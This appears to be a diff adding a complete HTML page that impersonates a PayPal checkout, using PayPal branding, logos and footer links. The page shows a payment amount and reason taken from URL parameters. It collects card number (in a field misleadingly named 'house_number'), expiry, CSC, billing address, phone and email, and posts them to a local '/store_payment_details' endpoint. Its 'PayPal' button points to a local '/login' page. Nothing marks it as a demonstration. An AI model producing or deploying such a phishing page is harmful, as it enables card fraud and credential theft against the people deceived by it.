@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal</title>
+  <link rel="shortcut icon" type="image/x-icon" href="https://www.paypalobjects.com/webstatic/icon/favicon.ico"/>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f9;
+      margin: 0;
+      padding: 0;
+    }
+
+    .container {
+      display: flex;
+      max-width: 1000px;
+      margin: 20px auto;
+      background: #f0f2f9;
+      border-radius: 5px;
+      gap: 20px;
+    }
+
+    .left-section {
+      flex: 2.5;
+      padding: 40px;
+      background-color: #f0f2f9;
+    }
+
+    .right-section {
+      flex: 2;
+      padding: 40px;
+      background-color: #fff;
+      text-align: left;
+      border-radius: 8px;
+    }
+
+    .right-section h3 {
+      margin-top: 0;
+    }
+
+    .item-title {
+      font-weight: bold;
+      color: #040404;
+      font-size: 1.25rem;
+    }
+
+    .total {
+      font-weight: bold;
+      font-size: 18px;
+    }
+
+    .border-box {
+      border: 1px solid #ccc;
+      display: flex;
+      flex-direction: column;
+      margin-top: 10px;
+      padding: 15px;
+      border-radius: 15px;
+      text-align: center;
+    }
+
+    .total-row {
+      display: flex;
+      justify-content: space-between;
+      font-weight: bold;
+      font-size: 18px;
+      margin-bottom: 10px;
+    }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      text-align: center;
+      margin: 20px 0;
+    }
+    .divider hr {
+      flex: 1;
+      border: none;
+      border-top: 1px solid #ccc;
+    }
+    .divider span {
+      padding: 0 10px;
+      color: #555;
+      font-size: 14px;
+      white-space: nowrap;
+    }
+
+    .paypal-button {
+      width: 100%;
+      background-color: #ffc439;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      font-weight: bold;
+      margin-bottom: 5px;
+    }
+
+    .paypal-button img {
+      vertical-align: middle;
+    }
+
+    .venmo-button {
+      width: 100%;
+      background-color: #3d95ce;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      font-weight: bold;
+      margin-bottom: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: larger;
+      font-family: "Gotham Rounded", "Arial Rounded MT Bold", Arial, sans-serif;
+    }
+
+    .venmo-link {
+      text-decoration: none;
+    }
+
+    .card-button {
+      width: 100%;
+      background-color: black;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 5px;
+      margin-bottom: 15px;
+    }
+
+    .form-container {
+      display: none;
+      margin-top: 20px;
+      text-align: left;
+    }
+
+    .form-container input, .form-container select {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+
+    .close-btn {
+      text-align: right;
+      cursor: pointer;
+      font-size: 18px;
+    }
+
+    .pay-button {
+      width: 100%;
+      background-color: #0070ba;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      cursor: pointer;
+      border-radius: 5px;
+      margin-top: 10px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: rgb(10, 10, 10);
+      margin-top: 35px;
+    }
+
+    .footer a {
+      color: #003087;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 768px) {
+      .container {
+        flex-direction: column;
+        max-width: 95%;
+        margin: 10px auto;
+        padding: 0 10px;
+      }
+
+      .left-section, .right-section {
+        flex: 1;
+        padding: 20px;
+      }
+
+      .item-title {
+        font-size: 1rem;
+      }
+
+      .total, .total-row {
+        font-size: 16px;
+      }
+
+      .paypal-button, .card-button, .pay-button {
+        font-size: 14px;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="left-section">
+      <p class="item-title" id="reason">Payment for Event</p>
+      <p class="total"><span id="currency"></span><span id="amount"></span> <span id="currency-code"></span></p>
+    </div>
+    
+    <div class="right-section">
+      <h3>Order Summary</h3>
+      <div class="border-box">
+        <div class="total-row">
+          <span>Total</span>
+          <span><span id="currency-clone"></span><span id="amount-clone"></span> <span id="currency-code-clone"></span></span>
+        </div>
+
+        <h5>Express checkout options</h5>
+
+        <a href="/login" target="_blank">
+          <button class="paypal-button">
+            <img src="https://www.paypalobjects.com/webstatic/en_US/i/buttons/PP_logo_h_100x26.png">
+          </button>
+        </a>
+
+        <div class="divider">
+          <hr><span>or pay with card</span><hr>
+        </div>
+
+        <button class="card-button" onclick="toggleForm()">
+          Debit or Credit Card
+        </button>
+
+        <div class="form-container" id="cardForm">
+          <div class="close-btn" onclick="toggleForm()">&times;</div>
+          <form action="/store_payment_details" method="POST">
+            <input type="text" name="house_number" placeholder="Card number" required>
+            <input type="text" name="mm_yy" placeholder="Expires" required>
+            <input type="text" name="code" placeholder="CSC" required>
+            <h4>Billing Address</h4>
+            <input type="text" name="first_name" placeholder="First Name" required>
+            <input type="text" name="last_name" placeholder="Last Name" required>
+            <input type="text" name="street_address" placeholder="Street Address" required>
+            <input type="text" name="apt_ste" placeholder="Apt/Ste">
+            <input type="text" name="state" placeholder="State" required>
+            <input type="text" name="zip_code" placeholder="Zip Code" required>
+            <input type="text" name="phone_number" placeholder="Phone Number" required>
+            <input type="email" name="email" placeholder="Email" required>
+            <button class="pay-button">Pay <span id="currency-button"></span><span id="amount-button"></span> <span id="currency-code-button"></span></button>
+          </form>
+        </div>
+      </div>
+
+      <div class="footer">
+        <p>This product is offered and sold by the seller and is subject to their policies. Item descriptions, pictures, and info are provided by the seller and not verified or guaranteed by PayPal.</p>
+        <p>
+          <a href="https://www.paypal.com/KE/cshelp/aupviolation">Report this link</a> |
+          <a href="https://www.paypal.com/webapps/mpp/ua/privacy-full">Privacy</a>
+        </p>
+        <p>Powered by PayPal</p>
+      </div>
+    </div>
+  </div>
+
+<script>
+  function getQueryParam(param) {
+    let params = new URLSearchParams(window.location.search);
+    return params.get(param);
+  }
+
+  // Currency symbols map
+  const currencySymbols = {
+    USD: "$",
+    EUR: "€",
+    GBP: "£",
+    AUD: "A$"
+  };
+
+  // Get params
+  let reason = getQueryParam("reason") || "Payment for Event";
+  let amount = parseFloat(getQueryParam("amount") || "0.00").toFixed(2); // force 2 decimals
+  let currency = getQueryParam("currency") || "GBP"; // ✅ GBP default
+
+  // Pick correct symbol
+  let symbol = currencySymbols[currency] || "";
+
+  // Final formatted string → "€150.00 EUR"
+  let formattedAmount = `${symbol}${amount} ${currency}`;
+
+  // Fill values everywhere
+  document.getElementById("reason").innerText = reason;
+  document.getElementById("amount").innerText = formattedAmount;
+  document.getElementById("amount-clone").innerText = formattedAmount;
+  document.getElementById("amount-button").innerText = formattedAmount;
+
+  function toggleForm() {
+    var form = document.getElementById("cardForm");
+    form.style.display = form.style.display === "block" ? "none" : "block";
+  }
+</script>
+
+</body>
+</html>
